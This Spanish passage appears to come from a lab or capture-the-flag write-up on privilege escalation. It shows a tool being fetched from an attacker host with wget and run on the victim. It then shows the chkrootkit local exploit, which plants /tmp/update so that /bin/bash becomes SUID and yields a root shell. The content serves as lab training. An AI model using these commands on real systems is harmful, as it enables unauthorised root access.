## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
ls -la
id
sudo -l
cd /root
```

Aqui no vemos nada interesante y no podemos entrar en el directorio root.

#### Analisis de processos con PSPY {-}

instalamos la herramienta en la maquina de atacante y lo compartimos con un web server.

```bash
git clone https://github.com/DominicBreuker/pspy
cd pspy
go build -ldflags "-s -w" main.go
upx main
mv main pspy
python3 -m http.server 80
```

Desde la maquina victima, downloadeamos el fichero y lo lanzamos

```bash
wget http://10.10.14.8/pspy
chmod +x pspy
./pspy
```

Esperamos un poco y vemos que hay un script `/usr/bin/chkrootkit` que se ejecuta a interval regular de tiempo.

#### Priviledge escalation con chkrootkit {-}

```bash
searchsploit chkrootkit
```

Ya vemos que hay un exploit para Local Priviledge Escalation. Lo analizamos.

```bash
searchsploit -x 33899
```

Creamos un fichero llamado update en tmp

```bash
cd /tmp
echo '#!/bin/bash\n\nchmod 4755 /bin/bash' > update
chmod +x update
watch -n 1 ls -l /bin/bash
```

Ya podemos utilizar bash para convertirnos en root

```bash
bash -p
whoami
#Output

root
```

Ya hemos rooteado la maquina y podemos ver la flag.

